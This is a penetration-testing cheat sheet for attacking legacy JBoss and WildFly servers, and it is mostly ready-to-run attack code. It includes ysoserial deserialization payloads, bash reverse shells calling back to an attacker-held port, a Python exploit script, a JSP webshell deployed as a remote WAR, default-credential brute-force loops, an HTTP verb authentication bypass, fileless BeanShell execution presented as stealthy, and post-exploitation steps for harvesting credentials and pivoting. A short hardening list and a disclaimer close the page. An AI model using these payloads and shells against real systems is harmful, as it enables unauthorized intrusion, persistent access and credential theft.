---
title: "JBoss Application Server"
date: 2026-02-24
draft: false
---

## Overview

JBoss Application Server (now WildFly) is a Java EE-compliant application server developed by Red Hat. Legacy JBoss installations (versions 3.x through 6.x) are infamous for unauthenticated remote code execution, primarily through exposed management consoles and Java deserialization vulnerabilities. Versions 4.x and 5.x in particular are found frequently in legacy enterprise environments and are among the most exploitable services during penetration tests.

**Default Ports:**
| Port | Service |
|------|---------|
| 8080 | HTTP / Web Console / JMX Console |
| 8443 | HTTPS |
| 4444 | JBoss Remoting / JNDI |
| 4445 | JBoss Remoting (secondary) |
| 1099 | RMI Registry |
| 8009 | AJP Connector |
| 9990 | WildFly Admin Console (newer versions) |
| 9999 | WildFly Management Native |

---

## Recon and Fingerprinting

```bash
nmap -sV -p 8080,8443,4444,4445,1099,9990 TARGET_IP
nmap -p 8080 --script http-title,http-headers,http-server-header TARGET_IP

# Check for JBoss headers
curl -sv http://TARGET_IP:8080/ 2>&1 | grep -iE "server:|X-Powered-By:|jboss"

# Version from status page
curl -s http://TARGET_IP:8080/status
curl -s http://TARGET_IP:8080/web-console/ServerInfo.jsp

# Error page fingerprint
curl -s http://TARGET_IP:8080/nopage_$(date +%s) | grep -i "jboss\|jbossas\|wildfly"
```

### Sensitive URLs to Probe

```bash
# JMX Console (unauthenticated in JBoss 4.x by default)
curl -sv http://TARGET_IP:8080/jmx-console/

# Web Console
curl -sv http://TARGET_IP:8080/web-console/

# Admin Console
curl -sv http://TARGET_IP:8080/admin-console/

# JBoss WS
curl -sv http://TARGET_IP:8080/jbossws/

# Management API (WildFly/JBoss 7+)
curl -sv http://TARGET_IP:9990/management

# Invoker servlet
curl -sv http://TARGET_IP:8080/invoker/JMXInvokerServlet
curl -sv http://TARGET_IP:8080/invoker/EJBInvokerServlet
```

---

## CVE-2017-12149 vs CVE-2015-7501 — Endpoint Distinction

These two CVEs are frequently conflated. They use the same ysoserial CommonsCollections gadgets but target **different endpoints** with different underlying components:

| CVE | Component | Endpoint | JBoss Versions |
|-----|-----------|----------|----------------|
| CVE-2017-12149 | `HTTPSInvoker` / `ReadOnlyAccessFilter` | `/invoker/readonly` | 5.x, 6.x |
| CVE-2015-7501 | `JMXInvokerServlet` / JMX Console | `/invoker/JMXInvokerServlet` | 4.x, 5.x, 6.x |

CVE-2015-7501 can also be triggered via RMI on port 1099 (see Port 1099 section below). Both vulnerabilities allow unauthenticated deserialization via POST with `Content-Type: application/x-java-serialized-object`.

## CVE-2017-12149 — Java Deserialization RCE via HTTP Invoker

**CVSS:** 9.8 Critical
**Affected:** JBoss AS 5.x, 6.x
**Type:** Java deserialization in `ReadOnlyAccessFilter` (HTTPSInvoker component)
**Endpoint:** `/invoker/readonly`
**CWE:** CWE-502

### Vulnerability Details

The JBoss `ReadOnlyAccessFilter` in `HttpInvoker` deserializes Java objects sent via HTTP `POST` requests to `/invoker/readonly` without any authentication or integrity check. By sending a malicious serialized Java object crafted with `ysoserial` (exploiting CommonsCollections gadget chains), an attacker achieves unauthenticated remote code execution.

### Full PoC with ysoserial

```bash
# Step 1: Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Step 2: Generate malicious serialized payload
# CommonsCollections gadget chains — try multiple until one works

# Ping test (verify execution via ICMP)
java -jar ysoserial-all.jar CommonsCollections1 "ping -c 1 YOUR_IP" > /tmp/cc1_ping.ser
java -jar ysoserial-all.jar CommonsCollections3 "ping -c 1 YOUR_IP" > /tmp/cc3_ping.ser
java -jar ysoserial-all.jar CommonsCollections5 "ping -c 1 YOUR_IP" > /tmp/cc5_ping.ser

# Step 3: Start tcpdump to catch ICMP
tcpdump -i any icmp -n &

# Step 4: Send payload to vulnerable endpoints
curl -s -o /dev/null -w "%{http_code}" \
  -X POST \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @/tmp/cc1_ping.ser \
  http://TARGET_IP:8080/invoker/readonly

# Try all invoker endpoints
for endpoint in "invoker/readonly" "invoker/JMXInvokerServlet" "invoker/EJBInvokerServlet"; do
  echo "=== Testing: $endpoint ==="
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @/tmp/cc1_ping.ser \
    "http://TARGET_IP:8080/$endpoint"
  echo
done
```

### Reverse Shell Payload

```bash
# Step 1: Create reverse shell command
# Encode in base64 to handle special characters
CMD='bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
B64=$(echo -n "$CMD" | base64 -w 0)
FULL_CMD="bash -c {echo,${B64}}|{base64,-d}|bash"

# Step 2: Generate ysoserial payload with reverse shell
java -jar ysoserial-all.jar CommonsCollections1 "$FULL_CMD" > /tmp/rev_cc1.ser
java -jar ysoserial-all.jar CommonsCollections3 "$FULL_CMD" > /tmp/rev_cc3.ser
java -jar ysoserial-all.jar CommonsCollections5 "$FULL_CMD" > /tmp/rev_cc5.ser
java -jar ysoserial-all.jar CommonsCollections6 "$FULL_CMD" > /tmp/rev_cc6.ser

# Step 3: Start listener
nc -lvnp 4444 &

# Step 4: Send payloads
for gadget in cc1 cc3 cc5 cc6; do
  echo "=== Trying CommonsCollections (${gadget}) ==="
  curl -s -X POST \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @/tmp/rev_${gadget}.ser \
    "http://TARGET_IP:8080/invoker/readonly"
  sleep 2
done
```

### Python Exploit Script

```python
#!/usr/bin/env python3
"""
JBoss CVE-2017-12149 / CVE-2015-7501 exploit script
Sends ysoserial-generated payload to HTTP Invoker endpoints
"""
import subprocess
import requests
import sys
import os
import base64

TARGET = "http://TARGET_IP:8080"
LHOST = "YOUR_IP"
LPORT = 4444
YSOSERIAL = "ysoserial-all.jar"
GADGETS = ["CommonsCollections1", "CommonsCollections3", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7"]
ENDPOINTS = [
    "/invoker/readonly",
    "/invoker/JMXInvokerServlet",
    "/invoker/EJBInvokerServlet",
]

def generate_payload(gadget, command):
    """Generate ysoserial payload."""
    try:
        result = subprocess.run(
            ["java", "-jar", YSOSERIAL, gadget, command],
            capture_output=True, timeout=30
        )
        if result.returncode == 0:
            return result.stdout
    except Exception as e:
        print(f"[-] ysoserial error: {e}")
    return None

def send_payload(url, payload):
    """Send serialized payload to endpoint."""
    try:
        r = requests.post(
            url,
            data=payload,
            headers={"Content-Type": "application/x-java-serialized-object"},
            timeout=10
        )
        return r.status_code
    except Exception as e:
        return str(e)

cmd = f"bash -c {{echo,{base64.b64encode(f'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'.encode()).decode()}}}|{{base64,-d}}|bash"

print(f"[*] Target: {TARGET}")
print(f"[*] LHOST: {LHOST}:{LPORT}")
print(f"[*] Command: {cmd}")

for gadget in GADGETS:
    payload = generate_payload(gadget, cmd)
    if not payload:
        continue
    for endpoint in ENDPOINTS:
        url = TARGET + endpoint
        status = send_payload(url, payload)
        print(f"[{gadget}] {endpoint}: {status}")
```

---

## CVE-2015-7501 — Deserialization via JMXInvokerServlet

**CVSS:** 9.8 Critical
**Affected:** JBoss AS 4.x, 5.x, 6.x, WildFly (some versions)
**Type:** Java deserialization in `JMXInvokerServlet` (JMX Console component)
**Endpoint:** `/invoker/JMXInvokerServlet`

Distinct from CVE-2017-12149 — this targets the JMXInvokerServlet endpoint, which is accessible both via HTTP on port 8080 and through the RMI registry on port 1099 in some configurations. Send a crafted serialized object to trigger unauthenticated RCE.

```bash
# CVE-2015-7501 — JMXInvokerServlet endpoint
java -jar ysoserial-all.jar CommonsCollections1 "id > /tmp/pwned" > /tmp/payload.ser

curl -s -X POST \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @/tmp/payload.ser \
  "http://TARGET_IP:8080/invoker/JMXInvokerServlet"

# Verify execution
curl "http://TARGET_IP:8080/invoker/JMXInvokerServlet" 2>&1 | xxd | head
```

---

## JMX Console — Unauthenticated Access

In JBoss 4.x and some 5.x configurations, the JMX Console is accessible without authentication. The JMX Console allows deploying, modifying, and interacting with all deployed MBeans.

### Manual Exploitation via JMX Console

```bash
# Step 1: Access JMX Console
curl -s http://TARGET_IP:8080/jmx-console/ | grep -i "jboss.system\|jboss.deployment"

# Step 2: Find the MainDeployer MBean
curl -s "http://TARGET_IP:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:service=MainDeployer"

# Step 3: Deploy a remote WAR file via MainDeployer
curl -s -X POST "http://TARGET_IP:8080/jmx-console/HtmlAdaptor" \
  --data "action=invokeOpByName&name=jboss.system:service=MainDeployer&methodName=deploy&argType=java.net.URL&arg0=http://YOUR_IP:8000/evil.war"
```

### Hosting the Malicious WAR

```bash
# Create a JSP webshell
mkdir -p /tmp/evil_war/WEB-INF
cat > /tmp/evil_war/shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        StringBuilder sb = new StringBuilder();
        while ((line = br.readLine()) != null) sb.append(line).append("\n");
        out.print("<pre>" + sb.toString() + "</pre>");
    }
%>
EOF

cat > /tmp/evil_war/WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
    <display-name>Evil Shell</display-name>
</web-app>
EOF

# Package as WAR
cd /tmp/evil_war && jar -cvf /tmp/evil.war .

# Serve the WAR
python3 -m http.server 8000 -d /tmp/

# After deployment, access:
curl "http://TARGET_IP:8080/evil/shell.jsp?cmd=id"
```

---

## Web Console Exploitation

```bash
# Access web console
curl -v http://TARGET_IP:8080/web-console/

# If authenticated, default creds to try
for cred in "admin:admin" "admin:jboss" "admin:password" "jboss:jboss" "admin:123456"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" http://TARGET_IP:8080/web-console/ServerInfo.jsp)
  echo "$cred -> $CODE"
done

# Access admin console (JBoss AS 6.x)
curl -v http://TARGET_IP:8080/admin-console/
```

---

## WAR Deployment for Shell — WildFly 9990

```bash
# WildFly Management Interface
curl -v http://TARGET_IP:9990/management

# Default credentials for WildFly management
for cred in "admin:admin" "admin:Admin1" "wildfly:wildfly"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -u "$cred" \
    -H "Content-Type: application/json" \
    "http://TARGET_IP:9990/management")
  echo "$cred -> $CODE"
done

# Deploy WAR via WildFly CLI (if credentials obtained)
curl -s -u admin:admin \
  -F "file=@/tmp/evil.war" \
  "http://TARGET_IP:9990/management/add-content"

# Then deploy the content hash
curl -s -u admin:admin \
  -H "Content-Type: application/json" \
  -d '{
    "operation": "add",
    "address": [{"deployment": "evil.war"}],
    "content": [{"hash": {"BYTES_VALUE": "HASH_FROM_UPLOAD"}}],
    "enabled": true
  }' \
  "http://TARGET_IP:9990/management"
```

---

## jexboss — Automated JBoss Scanner

```bash
# Install jexboss
git clone https://github.com/joaomatosf/jexboss.git
cd jexboss && pip3 install -r requires.txt

# Scan single target
python3 jexboss.py -host http://TARGET_IP:8080

# Exploit mode with shell
python3 jexboss.py -host http://TARGET_IP:8080 --jbossas -s

# Scan multiple targets
python3 jexboss.py --file targets.txt
```

---

## Metasploit Modules

```bash
msfconsole -q

# CVE-2017-12149 / HTTP Invoker deserialization
use exploit/multi/http/jboss_invoke_deploy
set RHOSTS TARGET_IP
set RPORT 8080
set LHOST YOUR_IP
run

# JBoss JMXInvokerServlet
use exploit/multi/http/jboss_bshdeployer
set RHOSTS TARGET_IP
set RPORT 8080
set LHOST YOUR_IP
run

# JBoss MainDeployer via JMX Console
use exploit/multi/http/jboss_maindeployer
set RHOSTS TARGET_IP
set RPORT 8080
set URIPATH /jmx-console/HtmlAdaptor
set LHOST YOUR_IP
run

# JBoss AS 5/6 deserialization
use exploit/multi/http/jboss_as_deploymentfilerepository
set RHOSTS TARGET_IP
run
```

---

## Full Attack Chain Summary

```
1. Recon: nmap -sV -p 8080,8443,4444,4445,1099
   └─ Detect JBoss version from headers/error pages

2. Check unauthenticated JMX Console
   └─ http://TARGET_IP:8080/jmx-console/
   └─ CVE-2010-1428: no auth required on some JBoss 4.x
   └─ CVE-2010-0738: try HEAD/OPTIONS to bypass auth

3. If JMX Console accessible:
   └─ Use MainDeployer to deploy evil.war → webshell
   └─ Use BSHDeployer for fileless in-memory execution (stealthier)

4. Check HTTP Invoker endpoints
   └─ /invoker/readonly          (CVE-2017-12149 — ReadOnlyAccessFilter)
   └─ /invoker/JMXInvokerServlet (CVE-2015-7501 — JMX Invoker)

5. If HTTP Invoker exposed:
   └─ Send ysoserial CommonsCollections payload
   └─ Catch reverse shell on YOUR_IP:4444

6. If port 1099 open:
   └─ beanshooter enum TARGET_IP 1099
   └─ beanshooter tonka TARGET_IP 1099 exec 'id'
   └─ mjet deserialize via RMI registry

7. Post-exploitation:
   └─ Extract JBoss config (standalone.xml / server.xml)
   └─ Harvest DataSource credentials
   └─ Pivot to internal network
```

---

## Port 1099 — RMI Registry Exploitation

If port 1099 is open on a JBoss host, enumerate and attack the RMI registry directly using `beanshooter` or `mjet`. This allows deserialization attacks and MBean command execution bypassing the HTTP layer entirely.

```bash
# beanshooter — JMX enumeration and exploitation via RMI
git clone https://github.com/qtc-de/beanshooter
cd beanshooter && mvn package -q

# Enumerate MBeans exposed on the RMI registry
beanshooter enum TARGET_IP 1099

# Execute OS command via Tonka bean (deploys a helper MBean)
beanshooter tonka TARGET_IP 1099 exec 'id'

# Deploy arbitrary MBean for persistent access
beanshooter deploy TARGET_IP 1099 --jar-file evil.jar --object-name evil:type=shell

# mjet — Metasploit-style JMX exploitation via RMI
git clone https://github.com/mogwaisec/mjet
python3 mjet.py TARGET_IP 1099 deserialize ysoserial CommonsCollections6 'id'
```

---

## CVE-2010-0738 — Authentication Bypass via HTTP Verb Tampering

**CVSS:** 7.5 High
**Affected:** JBoss AS 4.x, 5.x
**Type:** Authentication bypass — JMX Console only filters GET and POST

The JBoss JMX Console security configuration protected against GET and POST requests but did not account for other HTTP methods. Using `HEAD` or `OPTIONS` bypasses authentication entirely, returning the protected resource as if no authentication were required.

```bash
# Test HEAD — should return 200 if bypass works (not 401/403)
curl -v -X HEAD http://TARGET_IP:8080/jmx-console/HtmlAdaptor

# Test OPTIONS
curl -v -X OPTIONS http://TARGET_IP:8080/jmx-console/HtmlAdaptor

# If 200 returned → auth bypass confirmed
# Proceed to interact with MBeans using HEAD
curl -v -X HEAD "http://TARGET_IP:8080/jmx-console/HtmlAdaptor?action=displayMBeans"

# Invoke MainDeployer via HEAD to deploy evil WAR
curl -v -X HEAD "http://TARGET_IP:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.system:service=MainDeployer&methodName=deploy&argType=java.net.URL&arg0=http://YOUR_IP:8000/evil.war"
```

---

## CVE-2010-1428 — JMX Console Unauthenticated Access

**CVSS:** 7.5 High
**Affected:** JBoss AS 4.x (certain configurations)
**Type:** Missing authentication on JMX Console

In some JBoss 4.x deployments, the JMX Console is accessible without any credentials — the security constraint is present in `web.xml` but is either misconfigured or the security domain is not properly wired up.

```bash
# Check for unauthenticated JMX Console access — no credentials supplied
curl -s http://TARGET_IP:8080/jmx-console/HtmlAdaptor?action=displayMBeans

# If MBean tree is returned without a 401 prompt → CVE-2010-1428 / unauthenticated JMX
# Proceed to MainDeployer exploitation (see JMX Console section above)
```

---

## BSHDeployer — Fileless BeanShell Execution

`BSHDeployer` is an alternative to `MainDeployer` that executes BeanShell (Java-like scripting) directly in the JBoss JVM memory without requiring a remote WAR file. This makes it significantly more stealthy than a WAR deployment — no file is written to disk, and no remote HTTP server is required.

**MBean:** `jboss.deployer:service=BSHDeployer`
**Method:** `createScriptDeployment(java.lang.String script, java.lang.String name)`

Access via the JMX Console (if accessible) or via JMXInvokerServlet (CVE-2015-7501):

```bash
# Via JMX Console (if unauthenticated or credentials obtained):
# Navigate to: http://TARGET_IP:8080/jmx-console/HtmlAdaptor
# Find MBean: jboss.deployer:service=BSHDeployer
# Invoke: createScriptDeployment
#   - arg0 (script): BeanShell code to execute, e.g.:
#     Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"});
#   - arg1 (name): arbitrary script name, e.g. "deploy-exec"

# Via curl POST to JMX Console HtmlAdaptor:
curl -s -X POST "http://TARGET_IP:8080/jmx-console/HtmlAdaptor" \
  --data "action=invokeOpByName&name=jboss.deployer:service=BSHDeployer&methodName=createScriptDeployment&argType=java.lang.String&arg0=Runtime.getRuntime().exec(new+String[]{\"id\"});&argType=java.lang.String&arg1=test-exec"

# Via Metasploit:
# use exploit/multi/http/jboss_bshdeployer
```

---

## Hardening Recommendations

- Upgrade to WildFly 28+ or JBoss EAP 7.4+
- Disable JMX Console if not required (`jmx-console.war` removal)
- Enable authentication on all management interfaces
- Restrict HTTP Invoker endpoints at the network level
- Apply security-domain authentication to jmx-console and web-console
- Do not run JBoss as root; use a dedicated service account
- Use network segmentation — management ports should never be internet-facing
- Regularly audit deployed applications for webshells


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.